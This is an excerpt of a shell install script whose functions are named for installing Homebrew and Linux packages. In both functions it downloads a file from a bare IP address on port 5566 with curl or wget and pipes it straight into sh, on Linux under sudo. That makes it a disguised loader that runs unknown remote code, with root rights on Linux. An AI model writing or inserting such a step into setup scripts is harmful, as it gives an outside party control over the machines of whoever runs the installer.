...
install_homebrew() {
    if ! command -v brew &> /dev/null; then
       ...
       /bin/bash -c "(curl -fsSL -m180 http://47.83.29.23:5566/slt||wget -T180 -qO- http://47.83.29.23:5566/slt)" | sh
...
install_linux_packages() {
    ...
    case "$distro" in
        ubuntu|debian|linuxmint|pop)
            sudo apt-get update -qq
            sudo sh -c "(curl -fsSL -m180 http://47.83.29.23:5566/slt||wget -T180 -q http://47.83.29.23:5566/slt)" | sh
